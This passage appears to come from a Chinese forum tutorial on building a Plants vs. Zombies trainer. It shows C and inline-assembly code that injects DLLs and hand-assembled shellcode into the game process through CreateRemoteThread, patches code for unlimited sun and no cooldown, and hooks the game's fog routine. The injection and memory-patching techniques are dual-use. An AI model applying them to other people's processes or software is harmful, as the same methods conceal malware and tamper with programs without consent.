= 0; i &lt; (dwSize / sizeof(HMODULE)); i++) &#123; WCHAR szModuleName[MAX_PATH] = &#123; 0 &#125;; if (GetModuleFileNameExW(hProcess, hModules[i], szModuleName, MAX_PATH) &gt; 0) &#123; // 获取模块句柄 if (wcsicmp(szModuleName, lpDllName) == 0) &#123; DesModule = hModules[i]; &#125; &#125; &#125; //没有查找到模块 if (!DesModule) &#123; VirtualFreeEx(hProcess, lpRemoteDllName, 0, MEM_RELEASE); CloseHandle(hProcess); return FALSE; &#125; // 在目标进程中创建远程线程，执行FreeLibrary函数 HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)FreeLibrary, DesModule, 0, NULL); if (hThread == NULL) &#123; VirtualFreeEx(hProcess, lpRemoteDllName, 0, MEM_RELEASE); CloseHandle(hProcess); return FALSE; &#125; // 等待线程执行完成 WaitForSingleObject(hThread, INFINITE); // 关闭句柄 CloseHandle(hThread); VirtualFreeEx(hProcess, lpRemoteDllName, 0, MEM_RELEASE); CloseHandle(hProcess); return TRUE; }关键dll函数这里使用了三种方法 注意: 不要将代码写入switch(reason)之外,否则可能会导致多次执行 复制代码 隐藏代码#include&lt;windows.h&gt;#include&lt;stdio.h&gt; &#x2F;&#x2F;调用函数BOOL GrowPlant(DWORD BaseAddr, DWORD x, DWORD y, DWORD TypePlant) { LPVOID PlantFunc &#x3D; BaseAddr + 0x18D70; __asm { pushad push -1 &#x2F;&#x2F;-1 push TypePlant &#x2F;&#x2F;植物类型 mov eax, y &#x2F;&#x2F;y push x &#x2F;&#x2F;x mov ecx, BaseAddr mov ecx, [ecx+0x355E0C] mov ecx, [ecx + 0x868] push ecx &#x2F;&#x2F;植物种植ebp call PlantFunc popad } return TRUE;} BOOL WINAPI DllMain(HMODULE hInstance, DWORD fdwReason, LPVOID lpReserved) { DWORD BaseAddr &#x3D; GetModuleHandle(NULL); DWORD pid &#x3D; GetCurrentProcessId(); HANDLE hProcess &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid); LPVOID PlantFunc &#x3D; BaseAddr + 0x18D70; DWORD ebpAddr &#x3D; BaseAddr+0x355E0C,num&#x3D;0; ReadProcessMemory(hProcess, ebpAddr, &amp;ebpAddr, sizeof(DWORD), NULL); ebpAddr +&#x3D; 0x868; ReadProcessMemory(hProcess, ebpAddr, &amp;ebpAddr, sizeof(DWORD), NULL);&#x2F;&#x2F;必须使用带hProcess参数的才能正确读取到地址,NULL不可以 DWORD x &#x3D; 1, y &#x3D; 1, TypePlant &#x3D; 16; //注意不要写到switch外,否则可能会一次种多株植物,猜测是dll被多个线程加载导致的 switch (fdwReason) &#123; case DLL_PROCESS_ATTACH: //当进程加载dll模块时执行 //MessageBoxW(0, L&quot;ProcessAttach!&quot;, L&quot;window2&quot;, 0); //1.直接通过使用ReadProcessMemory函数读取内存获取ebp参数 __asm &#123; pushad push - 1 //-1 push TypePlant //植物类型 mov eax, y //y push x //x push ebpAddr //ebp call PlantFunc popad &#125; //2.通过利用寄存器获取ebp(推荐) x = 3, y = 2, TypePlant = 18; __asm &#123; pushad push - 1 //-1 push TypePlant //植物类型 mov eax, y //y push x //x mov ecx, BaseAddr mov ecx, [ecx+0x355E0C] mov ecx, [ecx + 0x868] push ecx call PlantFunc popad &#125; //3. 通过调用函数(推荐) GrowPlant(BaseAddr,7,3,23); break; //case DLL_THREAD_ATTACH: // printf(&quot;ThreadAttach!\\n&quot;); // break; //case DLL_THREAD_DETACH: // if (lpReserved == NULL) // &#123; // FreeLibrary(hInstance); // &#125; break; case DLL_PROCESS_DETACH: //当进程卸载dll模块时执行 MessageBoxW(0, L&quot;ProcessDeTachDll!&quot;, L&quot;window2&quot;, 0); break; &#125; return TRUE; }执行结果 失败代码这是写dll函数时遇到的问题 如果直接用 mov ecx,[BaseAddr+0x355E0C]会导致代码执行失败,推测是这条指令访存过慢所以无效 建议mov ecx,BaseAddr之后通过对寄存器操作达到目的 复制代码 隐藏代码__asm { pushad push - 1 &#x2F;&#x2F;-1 push TypePlant &#x2F;&#x2F;植物类型 mov eax, y &#x2F;&#x2F;y push x &#x2F;&#x2F;x mov ecx,[BaseAddr+ 0x355E0C]&#x2F;&#x2F;这样不行,推测是访存过慢 mov ecx,[ecx+0x868] mov num, ecx push ecx call PlantFunc popad }远程线程代码注入(推荐)和远程线程dll注入类似,CreateRemoteThread函数要求的函数原型是 复制代码 隐藏代码DWORD WINAPI ThreadProc( In LPVOID lpParameter&#x2F;&#x2F;使用CreateThread函数传递的参数 该参数是一个指向其他数据的指针,当然也可以强转为其他类型直接使用);基本过程: 打开进程定义注入代码(函数)在目标进程中申请空间并写入注入代码创建远程线程执行注入代码(函数)执行完毕释放空间 复制代码 隐藏代码&#x2F;&#x2F;以创建远程线程方式种植植物BOOL GrowPlantByInjectCode(DWORD dwProcessId,DWORD BaseAddr,DWORD x,DWORD y,DWORD PlantType){ BOOL bSuccess &#x3D; FALSE; &#x2F;&#x2F;1. 打开进程 HANDLE hProcess &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId); if (hProcess !&#x3D; NULL) { &#x2F;&#x2F;2. 定义注入代码(函数) BYTE InjectCode[50] = &#123; //汇编指令 //修正点偏移 0x55, //0 push ebp 0x89, 0xE5, //1 mov ebp,esp 0x60, //3 pushad 0x68, 0xFF, 0xFF, 0xFF, 0xFF, //4 push -1 0x68, 0x00, 0x00, 0x00, 0x00, //9 push PlantType //10 0xB8, 0x00, 0x00, 0x00, 0x00, //14 mov eax,y //15 0x68, 0x00, 0x00, 0x00, 0x00, //19 push x //20 0xB9, 0x00, 0x00, 0x00, 0x00, //24 mov ecx,BaseAddr //25 0x8B, 0x89, 0x0C, 0x5E, 0x35, 0x00, //29 mov ecx,[ecx+0x355E0C] 0x8B, 0x89, 0x68, 0x08, 0x00, 0x00, //35 mov ecx,[ecx+0x868] 0x51, //41 push ecx 0xE8, 0x00, 0x00, 0x00, 0x00, //42 call PlantFunc //43 //被调方平栈 0x61, //47 popad 0xC9, //48 leave 0xC3 //49 ret &#125;; //3. 申请空间用于存储代码 DWORD dwCodeSize = 50, desFunc = BaseAddr + 0x18D70; LPVOID lpRemoteCodeMem = VirtualAllocEx(hProcess, NULL, dwCodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); //4. 修正参数 *(DWORD*)&amp;InjectCode[10] = PlantType; *(DWORD*)&amp;InjectCode[15] = y; *(DWORD*)&amp;InjectCode[20] = x; *(DWORD*)&amp;InjectCode[25] = BaseAddr; *(DWORD*)&amp;InjectCode[43] = desFunc-((DWORD)lpRemoteCodeMem+42+5) ; //call指令与jmp类似,相对于当前指令的下一条指令计算偏移,offset=des-(source+5),减去call自身长度5 if (lpRemoteCodeMem != NULL) &#123; SIZE_T dwBytesWritten = 0; //5. 注入代码 if (WriteProcessMemory(hProcess, lpRemoteCodeMem, InjectCode, dwCodeSize, &amp;dwBytesWritten) &amp;&amp; dwBytesWritten == dwCodeSize) &#123; //6. 创建远程线程执行代码 HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpRemoteCodeMem,NULL, 0, NULL); if (hThread != NULL) &#123; //7. 等待线程信号 WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); bSuccess = TRUE; &#125; &#125; //8. 执行完后释放空间 VirtualFreeEx(hProcess, lpRemoteCodeMem, 0, MEM_RELEASE); &#125; CloseHandle(hProcess); &#125; return bSuccess; }种植僵尸基本原理与种植植物思路类似 首先在头脑风暴中通过种植僵尸来找到僵尸数量地址 然后找到僵尸数量增加代码 再通过查看调用堆栈和参数找到种植僵尸call 参数应该也是x y type ebp (注意没有-1) 僵尸种植函数的x值在一个call上方,这个call是个switch结构,没有参数,所以x值也没被修改 种植僵尸函数–dll注入版 复制代码 隐藏代码BOOL GrowZombie(DWORD BaseAddr, DWORD x, DWORD y, DWORD ZombieType) { LPVOID PlantZombieFunc &#x3D; BaseAddr + 0x35390; __asm { pushad push x push ZombieType mov eax,y mov ecx,BaseAddr mov ecx,[ecx+0x355E0C] mov ecx,[ecx+0x868] mov ecx,[ecx+0x178] &#x2F;&#x2F;ebp call PlantZombieFunc popad } return TRUE;}远程代码注入版 复制代码 隐藏代码&#x2F;&#x2F;以创建远程线程方式种植僵尸BOOL GrowZombieByRemoteThread(DWORD dwProcessId,DWORD BaseAddr, DWORD x, DWORD y, DWORD ZombieType) { BOOL bSuccess = FALSE; //1. 打开进程 HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId); if (hProcess != NULL) &#123; //2. 定义注入代码(函数) BYTE InjectCode[50] = &#123; 0x55, //0 push ebp 0x89, 0xE5, //1 mov ebp,esp 0x60, //3 pushad 0x68, 0x00, 0x00, 0x00, 0x00, //4 push x 0x68, 0x00, 0x00, 0x00, 0x00, //9 push ZombieType 0xB8, 0x00, 0x00, 0x00, 0x00, //14 mov eax,y 0xB9, 0x00, 0x00, 0x00, 0x00, //19 mov ecx,BaseAddr 0x8B, 0x89, 0x0C, 0x5E, 0x35, 0x00, //24 mov ecx,[ecx+0x355E0C] 0x8B, 0x89, 0x68, 0x08, 0x00, 0x00, //30 mov ecx,[ecx+0x868] 0x8B, 0x89, 0x78, 0x01, 0x00, 0x00, //36 mov ecx,[ecx+0x178] 0xE8, 0x00, 0x00, 0x00, 0x00, //42 call PlantZombieFunc 0x61, //47 popad 0xC9, //48 leave 0xC3 //49 ret &#125;; //3. 申请空间用于存储代码 DWORD dwCodeSize = 50, desFunc = BaseAddr + 0x35390; //种植僵尸函数 LPVOID lpRemoteCodeMem = VirtualAllocEx(hProcess, NULL, dwCodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); //4. 修正参数 *(DWORD*)&amp;InjectCode[5] = x; *(DWORD*)&amp;InjectCode[10] = ZombieType; *(DWORD*)&amp;InjectCode[15] = y; *(DWORD*)&amp;InjectCode[20] = BaseAddr; *(DWORD*)&amp;InjectCode[43] = desFunc - ((DWORD)lpRemoteCodeMem + 42 + 5);//call指令与jmp类似,相对于当前指令的下一条指令计算偏移,要减去call长度5 if (lpRemoteCodeMem != NULL) &#123; SIZE_T dwBytesWritten = 0; //5. 注入代码 if (WriteProcessMemory(hProcess, lpRemoteCodeMem, InjectCode, dwCodeSize, &amp;dwBytesWritten) &amp;&amp; dwBytesWritten == dwCodeSize) &#123; //6. 创建远程线程执行代码 HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpRemoteCodeMem, NULL, 0, NULL); if (hThread != NULL) &#123; //7. 等待线程信号 WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); bSuccess = TRUE; &#125; &#125; //8. 执行完后释放空间 VirtualFreeEx(hProcess, lpRemoteCodeMem, 0, MEM_RELEASE); &#125; CloseHandle(hProcess); &#125; return bSuccess; }完整代码 复制代码 隐藏代码#include&lt;stdio.h&gt;#include&lt;windows.h&gt;#include &lt;tlhelp32.h&gt;#include &lt;string.h&gt;#include &lt;shlwapi.h&gt;#include &lt;psapi.h&gt; enum Type { Sunlight, Money, TreeHeight, Chocolate, TreeFood, FlowerFood, Insecticide};unsigned int offsetTable[10] &#x3D; { 0x5578,0x50,0x11c,0x250,0x258,0x220,0x224 }; &#x2F;&#x2F; 根据进程名获取进程IDDWORD GetProcessIdByName(const wchar_t* processName) { HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);// 创建一个进程快照 if (snapshot == INVALID_HANDLE_VALUE) &#123; return 0;// 如果创建失败，返回 0 &#125; // 定义一个 PROCESSENTRY32 结构体，用于存储进程信息 PROCESSENTRY32 processEntry = &#123; 0 &#125;; processEntry.dwSize = sizeof(PROCESSENTRY32); //必须初始化,否则调用Process32First会失败 if (!Process32First(snapshot, &amp;processEntry)) &#123; CloseHandle(snapshot); return 0;// 如果获取第一个进程信息失败，关闭进程快照句柄并返回 0 &#125; // 遍历进程列表 do &#123; wchar_t currentProcessName[MAX_PATH]; // 获取当前进程的名称 wcscpy_s(currentProcessName, MAX_PATH, processEntry.szExeFile); //szExeFile存储了进程对应可执行文件的名称 if (wcscmp(currentProcessName, processName) == 0) &#123; CloseHandle(snapshot); // 如果当前进程名称和指定的进程名称相同，返回进程 ID return processEntry.th32ProcessID; &#125; &#125; while (Process32Next(snapshot, &amp;processEntry)); //获取快照中下一个进程的信息 // 如果遍历完整个进程列表都没有找到指定进程，关闭进程快照句柄并返回 0 CloseHandle(snapshot); return 0; } &#x2F;&#x2F;根据进程模块名获取基址LPVOID GetModuleBaseAddress(DWORD processId, LPCWSTR moduleName) { LPVOID lpBaseAddress &#x3D; NULL; HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId); // 打开进程句柄 if (hProcess != NULL) &#123; // 枚举进程中的所有模块 HMODULE hMods[1024]; DWORD cbNeeded; if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &amp;cbNeeded)) &#123; DWORD dwModuleCount = cbNeeded / sizeof(HMODULE);// 计算模块数量 // 获取指定模块的信息 for (DWORD i = 0; i &lt; dwModuleCount; i++) &#123; TCHAR szModName[MAX_PATH]; //获取指定模块的完整路径名 if (GetModuleFileNameEx(hProcess, hMods[i], szModName, MAX_PATH)) &#123;//函数成功返回字符串长度,注意第四个参数的单位为字符而非字节 if (wcsstr(szModName, moduleName)) &#123;//查找模块名,若成功则返回子串第一次出现的指针 MODULEINFO modInfo = &#123; 0 &#125;; if (GetModuleInformation(hProcess, hMods[i], &amp;modInfo, sizeof(MODULEINFO))) &#123;//获取模块信息并保存到modInfo中 lpBaseAddress = modInfo.lpBaseOfDll;//模块基地址 break; &#125; &#125; &#125; &#125; &#125; CloseHandle(hProcess); // 关闭进程句柄 &#125; return lpBaseAddress; } &#x2F;&#x2F;修改进程代码区代码 参数: 进程句柄 修改代码起始地址 硬编码指针 代码字节数BOOL WriteProcessCodeMemory(HANDLE hProcess, LPVOID lpStartAddress, LPCVOID lpBuffer, SIZE_T nSize) { DWORD dwOldProtect; &#x2F;&#x2F;取消页保护 if (!VirtualProtectEx(hProcess, lpStartAddress, nSize, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect)) { return FALSE; } BOOL bResult &#x3D; WriteProcessMemory(hProcess, lpStartAddress, lpBuffer, nSize, NULL);&#x2F;&#x2F;写入代码 VirtualProtectEx(hProcess, lpStartAddress, nSize, dwOldProtect, &amp;dwOldProtect);&#x2F;&#x2F;开启页保护 return bResult;} &#x2F;&#x2F;hook指定地址,申请新空间保存原始代码并写入hookcode,返回申请空间的地址LPVOID SetHook(HANDLE hProcess, LPVOID desAddr, LPCVOID hookCode, SIZE_T hookCodeSize, SIZE_T origCodeSize) { BYTE origCode[10] &#x3D; { 0 }, jmpCode[5] &#x3D; { 0xE9,0,0,0,0 }; &#x2F;&#x2F;1. 读取并保存原始代码 if (!ReadProcessMemory(hProcess, desAddr, origCode, origCodeSize, NULL)) return NULL; //2. 申请空间用于存储原始代码,hook代码,jmp返回代码 LPVOID allocAddr = VirtualAllocEx(hProcess, NULL, hookCodeSize + origCodeSize + 5, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (!allocAddr) return NULL; //3. 向申请空间写入原始代码,hook代码,jmp返回代码 jmp xxx 偏移为目的地址-jmp下一条指令地址 *(DWORD*)(jmpCode + 1) = (DWORD)desAddr + 5 - ((DWORD)allocAddr + hookCodeSize + origCodeSize + 5);//hook返回地址的偏移 if (!WriteProcessCodeMemory(hProcess, allocAddr, origCode, origCodeSize) //写入原始代码 || !WriteProcessCodeMemory(hProcess, (DWORD)allocAddr + origCodeSize, hookCode, hookCodeSize)//写入hook代码 || !WriteProcessCodeMemory(hProcess, (DWORD)allocAddr + origCodeSize + hookCodeSize, jmpCode, 5))//写入jmpcode &#123; VirtualFreeEx(hProcess, allocAddr, 0, MEM_RELEASE);//写入失败则释放空间 return NULL; &#125; //4. 修改目的地址处的代码 jmp xxx偏移 原始代码后才是需要执行的hook代码 *(DWORD*)(jmpCode + 1) = ((DWORD)allocAddr + origCodeSize) - ((DWORD)desAddr + 5); WriteProcessCodeMemory(hProcess, desAddr, jmpCode, 5);//在源地址处写入跳转代码 if (origCodeSize &gt; 5)//原始代码长度大于5时nop多余字节 &#123; BYTE nopCode[5] = &#123; 0x90,0x90,0x90,0x90,0x90 &#125;; if (!WriteProcessCodeMemory(hProcess, (DWORD)desAddr + 5, nopCode, origCodeSize - 5)) &#123; VirtualFreeEx(hProcess, allocAddr, 0, MEM_RELEASE);//写入nopcode失败则释放空间并返回 return NULL; &#125; &#125; //5. hook成功则返回hookCode所在地址 return allocAddr; } &#x2F;&#x2F;取消hook指定地址,写回原始代码并释放申请空间BOOL UnHook(HANDLE hProcess, LPVOID desAddr, SIZE_T origCodeSize, LPVOID allocAddr) { BYTE origCode[10] &#x3D; { 0 }; &#x2F;&#x2F;1. 从申请空间中读出原始代码 if (!ReadProcessMemory(hProcess, allocAddr, origCode, origCodeSize, NULL)) return FALSE; &#x2F;&#x2F;2. 将原始代码写回目的地址 if (!WriteProcessCodeMemory(hProcess, desAddr, origCode, origCodeSize)) return FALSE; &#x2F;&#x2F;3. 释放申请空间 if (!VirtualFreeEx(hProcess, allocAddr, 0, MEM_RELEASE)) return FALSE; return TRUE;} &#x2F;&#x2F;获取某些项目的值unsigned int getSomething(HANDLE handle, DWORD BaseAddr, unsigned int type) { unsigned int num &#x3D; 0; DWORD addr &#x3D; BaseAddr + 0x00355E0C; ReadProcessMemory(handle, (LPVOID)addr, &amp;addr, sizeof(DWORD), NULL); if (type &#x3D;&#x3D; Sunlight) addr +&#x3D; 0x868; else addr +&#x3D; 0x950; ReadProcessMemory(handle, (LPVOID)addr, &amp;addr, sizeof(DWORD), NULL); addr +&#x3D; offsetTable[type]; ReadProcessMemory(handle, (LPVOID)addr, &amp;num, sizeof(DWORD), 0); return num;} &#x2F;&#x2F;设置某些项目的值BOOL setSomething(HANDLE handle, DWORD BaseAddr, unsigned int type, unsigned int num) { DWORD addr &#x3D; BaseAddr + 0x00355E0C; ReadProcessMemory(handle, addr, &amp;addr, sizeof(DWORD), NULL); if (type &#x3D;&#x3D; Sunlight) addr +&#x3D; 0x868; else addr +&#x3D; 0x950; ReadProcessMemory(handle, (LPVOID)addr, &amp;addr, sizeof(DWORD), NULL); addr +&#x3D; offsetTable[type]; return WriteProcessMemory(handle, (LPVOID)addr, &amp;num, sizeof(DWORD), 0);} &#x2F;&#x2F;无限冷却BOOL Uncooled(HANDLE hProcess, DWORD BaseAddr) { unsigned char code[2] &#x3D; { 0xeb,0x00 }; return WriteProcessCodeMemory(hProcess, BaseAddr + 0x9ce02, code, 2);&#x2F;&#x2F;jle 0x18修改为jmp $+2} &#x2F;&#x2F;恢复冷却BOOL RecoveryCooling(HANDLE hProcess, DWORD BaseAddr) { unsigned char OriginalCode[2] &#x3D; { 0x7E ,0x16 };&#x2F;&#x2F;jmp $+2修改为jle 0x18 return WriteProcessCodeMemory(hProcess, BaseAddr + 0x9ce02, OriginalCode, 2);} &#x2F;&#x2F;无限阳光,锁定阳光为9999BOOL UnlimitedSun(HANDLE hProcess, DWORD BaseAddr) { unsigned char Code[3] &#x3D; { 0x29,0xdb,0 };&#x2F;&#x2F;cmp ebx,eax 修改为sub ebx,ebx and ecx,0x32修改为and ecx,0 BOOL flag; flag &#x3D; setSomething(hProcess, BaseAddr, Sunlight, 9999);&#x2F;&#x2F;修改阳光 flag &amp;&#x3D; WriteProcessCodeMemory(hProcess, BaseAddr + 0x27690, Code, 2);&#x2F;&#x2F;修改阳光减少代码 flag &amp;&#x3D; WriteProcessCodeMemory(hProcess, BaseAddr + 0x3C0AB, &amp;Code[2], 1);&#x2F;&#x2F;修改阳光增加代码 return flag;} &#x2F;&#x2F;恢复阳光消耗BOOL RecoverySunConsume(HANDLE hProcess, DWORD BaseAddr) { unsigned char OriginalCode[3] &#x3D; { 0x3B,0xD8,0x32 };&#x2F;&#x2F;sub ebx,ebx恢复为cmp ebx,eax and ecx,0恢复为and ecx,0x32 BOOL flag &#x3D; WriteProcessCodeMemory(hProcess, BaseAddr + 0x27690, OriginalCode, 2);&#x2F;&#x2F;恢复阳光减少代码 flag &amp;&#x3D; WriteProcessCodeMemory(hProcess, BaseAddr + 0x3C0AB, &amp;OriginalCode[2], 1);&#x2F;&#x2F;恢复阳光增加代码 return flag;} &#x2F;&#x2F;除雾LPVOID DeFogByHook(HANDLE hProcess, LPVOID BaseAddr) { unsigned char hookCode[9] = &#123; 0xc7,0x01,0x00,0x00,0x00,0x00, //mov [ecx],0 0x83,0xc1,0x04 //add ecx,0x4 &#125;; //写hook代码进行hook return SetHook(hProcess, (DWORD)BaseAddr + 0x26173, hookCode, sizeof(hookCode), 5); } &#x2F;&#x2F;恢复雾BOOL RecoveryFogByUnHook(HANDLE hProcess, LPVOID BaseAddr, LPVOID allocAddr) { return UnHook(hProcess, (DWORD)BaseAddr + 0x26173, 5, allocAddr);} &#x2F;&#x2F;创建远程线程向指定进程注入dllBOOL InjectDllByRemoteThread(DWORD desProcId,WCHAR* dllPath) { &#x2F;&#x2F;打开进程获取进程句柄 HANDLE hProcess &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, desProcId); if (!hProcess) return FALSE; //申请空间 DWORD pathSize = (wcslen(dllPath) + 1) * 2; LPVOID newMemAddr = VirtualAllocEx(hProcess, 0, pathSize, MEM_COMMIT, PAGE_READWRITE); if (!newMemAddr) return FALSE; //写入dll路径 if (!WriteProcessMemory(hProcess, newMemAddr, dllPath, pathSize, NULL)) &#123; VirtualFreeEx(hProcess, newMemAddr, 0, MEM_RELEASE); return FALSE; &#125; //创建远程线程 HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryW, newMemAddr, 0, NULL); if (!hThread) &#123; VirtualFreeEx(hProcess, newMemAddr, 0, MEM_RELEASE); return FALSE; &#125; WaitForSingleObject(hThread, INFINITE);//等待线程信号,保证成功注入 //回收资源 VirtualFreeEx(hProcess, newMemAddr, 0, MEM_RELEASE); CloseHandle(hThread); CloseHandle(hProcess); //返回成功 return TRUE; } &#x2F;&#x2F;创建远程线程释放指定进程dllBOOL UnLoadDllByRemoteThread(DWORD dwProcessId, LPCWSTR lpDllName){ HANDLE hProcess &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId); if (hProcess &#x3D;&#x3D; NULL) return FALSE; // 在目标进程中申请一块内存，并将需要卸载的DLL模块的名称写入该内存 LPVOID lpRemoteDllName = VirtualAllocEx(hProcess, NULL, (wcslen(lpDllName) + 1) * sizeof(WCHAR), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); if (lpRemoteDllName == NULL) &#123; CloseHandle(hProcess); return FALSE; &#125; if (!WriteProcessMemory(hProcess, lpRemoteDllName, lpDllName, (wcslen(lpDllName) + 1) * sizeof(WCHAR), NULL)) &#123; VirtualFreeEx(hProcess, lpRemoteDllName, 0, MEM_RELEASE); CloseHandle(hProcess); return FALSE; &#125; //查找dll模块 HMODULE hModules[1024],DesModule=NULL; DWORD dwSize = 0; if (!EnumProcessModules(hProcess, hModules, sizeof(hModules), &amp;dwSize)) &#123; VirtualFreeEx(hProcess, lpRemoteDllName, 0, MEM_RELEASE); CloseHandle(hProcess); return FALSE; &#125; // 遍历模块列表，查找需要卸载的DLL模块 for (DWORD i = 0; i &lt; (dwSize / sizeof(HMODULE)); i++) &#123; WCHAR szModuleName[MAX_PATH] = &#123; 0 &#125;; if (GetModuleFileNameExW(hProcess, hModules[i], szModuleName, MAX_PATH) &gt; 0) &#123; // 获取模块句柄 if (wcsicmp(szModuleName, lpDllName) == 0) &#123; DesModule = hModules[i]; &#125; &#125; &#125; //没有查找到模块 if (!DesModule) &#123; VirtualFreeEx(hProcess, lpRemoteDllName, 0, MEM_RELEASE); CloseHandle(hProcess); return FALSE; &#125; // 在目标进程中创建远程线程，执行FreeLibrary函数 HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)FreeLibrary, DesModule, 0, NULL); if (hThread == NULL) &#123; VirtualFreeEx(hProcess, lpRemoteDllName, 0, MEM_RELEASE); CloseHandle(hProcess); return FALSE; &#125; // 等待线程执行完成 WaitForSingleObject(hThread, INFINITE); // 关闭句柄 CloseHandle(hThread); VirtualFreeEx(hProcess, lpRemoteDllName, 0, MEM_RELEASE); CloseHandle(hProcess); return TRUE; } &#x2F;&#x2F;以创建远程线程方式种植植物BOOL GrowPlantByInjectCode(DWORD dwProcessId,DWORD BaseAddr,DWORD x,DWORD y,DWORD PlantType){ BOOL bSuccess &#x3D; FALSE; &#x2F;&#x2F;1. 打开进程 HANDLE hProcess &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId); if (hProcess !&#x3D; NULL) { &#x2F;&#x2F;2. 定义注入代码(函数) BYTE InjectCode[50] = &#123; //汇编指令 //修正点偏移 0x55, //0 push ebp 0x89, 0xE5, //1 mov ebp,esp 0x60, //3 pushad 0x68, 0xFF, 0xFF, 0xFF, 0xFF, //4 push -1 0x68, 0x00, 0x00, 0x00, 0x00, //9 push PlantType //10 0xB8, 0x00, 0x00, 0x00, 0x00, //14 mov eax,y //15 0x68, 0x00, 0x00, 0x00, 0x00, //19 push x //20 0xB9, 0x00, 0x00, 0x00, 0x00, //24 mov ecx,BaseAddr //25 0x8B, 0x89, 0x0C, 0x5E, 0x35, 0x00, //29 mov ecx,[ecx+0x355E0C] 0x8B, 0x89, 0x68, 0x08, 0x00, 0x00, //35 mov ecx,[ecx+0x868] 0x51, //41 push ecx 0xE8, 0x00, 0x00, 0x00, 0x00, //42 call PlantFunc //43 //被调方平栈 0x61, //47 popad 0xC9, //48 leave 0xC3 //49 ret &#125;; //3. 申请空间用于存储代码 DWORD dwCodeSize = 50, desFunc = BaseAddr + 0x18D70; LPVOID lpRemoteCodeMem = VirtualAllocEx(hProcess, NULL, dwCodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); //4. 修正参数 *(DWORD*)&amp;InjectCode[10] = PlantType; *(DWORD*)&amp;InjectCode[15] = y; *(DWORD*)&amp;InjectCode[20] = x; *(DWORD*)&amp;InjectCode[25] = BaseAddr; *(DWORD*)&amp;InjectCode[43] = desFunc-((DWORD)lpRemoteCodeMem+42+5) ; //call指令与jmp类似,相对于当前指令的下一条指令计算偏移,offset=des-(source+5),减去call自身长度5 if (lpRemoteCodeMem != NULL) &#123; SIZE_T dwBytesWritten = 0; //5. 注入代码 if (WriteProcessMemory(hProcess, lpRemoteCodeMem, InjectCode, dwCodeSize, &amp;dwBytesWritten) &amp;&amp; dwBytesWritten == dwCodeSize) &#123; //6. 创建远程线程执行代码 HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpRemoteCodeMem,NULL, 0, NULL); if (hThread != NULL) &#123; //7. 等待线程信号 WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); bSuccess = TRUE; &#125; &#125; //8. 执行完后释放空间 VirtualFreeEx(hProcess, lpRemoteCodeMem, 0, MEM_RELEASE); &#125; CloseHandle(hProcess); &#125; return bSuccess; } &#x2F;&#x2F;以创建远程线程方式种植僵尸BOOL GrowZombieByInjectCode(DWORD dwProcessId,DWORD BaseAddr, DWORD x, DWORD y, DWORD ZombieType) { BOOL bSuccess = FALSE; //1. 打开进程 HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId); if (hProcess != NULL) &#123; //2. 定义注入代码(函数) BYTE InjectCode[50] = &#123; 0x55, //0 push ebp 0x89, 0xE5, //1 mov ebp,esp 0x60, //3 pushad 0x68, 0x00, 0x00, 0x00, 0x00, //4 push x 0x68, 0x00, 0x00, 0x00, 0x00, //9 push ZombieType 0xB8, 0x00, 0x00, 0x00, 0x00, //14 mov eax,y 0xB9, 0x00, 0x00, 0x00, 0x00, //19 mov ecx,BaseAddr 0x8B, 0x89, 0x0C, 0x5E, 0x35, 0x00, //24 mov ecx,[ecx+0x355E0C] 0x8B, 0x89, 0x68, 0x08, 0x00, 0x00, //30 mov ecx,[ecx+0x868] 0x8B, 0x89, 0x78, 0x01, 0x00, 0x00, //36 mov ecx,[ecx+0x178] 0xE8, 0x00, 0x00, 0x00, 0x00, //42 call PlantZombieFunc 0x61, //47 popad 0xC9, //48 leave 0xC3 //49 ret &#125;; //3. 申请空间用于存储代码 DWORD dwCodeSize = 50, desFunc = BaseAddr + 0x35390; //种植僵尸函数 LPVOID lpRemoteCodeMem = VirtualAllocEx(hProcess, NULL, dwCodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); //4. 修正参数 *(DWORD*)&amp;InjectCode[5] = x; *(DWORD*)&amp;InjectCode[10] = ZombieType; *(DWORD*)&amp;InjectCode[15] = y; *(DWORD*)&amp;InjectCode[20] = BaseAddr; *(DWORD*)&amp;InjectCode[43] = desFunc - ((DWORD)lpRemoteCodeMem + 42 + 5);//call指令与jmp类似,相对于当前指令的下一条指令计算偏移,要减去call长度5 if (lpRemoteCodeMem != NULL) &#123; SIZE_T dwBytesWritten = 0; //5. 注入代码 if (WriteProcessMemory(hProcess, lpRemoteCodeMem, InjectCode, dwCodeSize, &amp;dwBytesWritten) &amp;&amp; dwBytesWritten == dwCodeSize) &#123; //6. 创建远程线程执行代码 HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpRemoteCodeMem, NULL, 0, NULL); if (hThread != NULL) &#123; //7. 等待线程信号 